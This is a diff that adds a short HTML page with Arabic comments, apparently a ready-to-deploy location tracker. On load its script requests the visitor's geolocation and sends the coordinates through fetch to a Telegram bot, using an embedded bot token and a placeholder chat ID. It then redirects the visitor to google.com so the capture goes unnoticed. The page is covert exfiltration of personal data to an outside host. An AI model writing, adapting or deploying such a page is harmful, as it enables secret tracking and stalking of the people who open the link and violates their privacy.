@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
+        
+        // ضع هنا رقم الـ ID الخاص بك بدلاً من العبارة التالية
+        var myChatId = "ضع_رقم_الأيدي_هنا"; 
+        var botToken = "8854034284:AAHvgUNrlJhNmjv20b-XN_ix-snoKws4E18";
+        
+        // إرسال البيانات للبوت
+        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + myChatId + "&text=📍 الموقع: " + lat + "," + lon);
+        
+        // إعادة توجيه المستخدم لجوجل
+        window.location.href = "https://google.com";
+    });
+</script>
+</body>
+</html>
